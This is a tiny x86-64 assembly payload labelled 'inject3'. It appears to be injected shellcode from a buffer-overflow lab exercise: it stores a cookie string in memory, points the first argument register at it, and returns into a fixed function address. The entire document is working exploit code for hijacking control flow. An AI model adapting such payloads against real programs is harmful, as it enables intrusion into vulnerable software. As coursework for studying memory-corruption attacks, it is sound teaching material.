inject3:
    mov     $0x55644e78, %rdi
    movabs  $0x6630636132306234, %rax
    movq    %rax, 0x55644e78
    push    $0x401980
    ret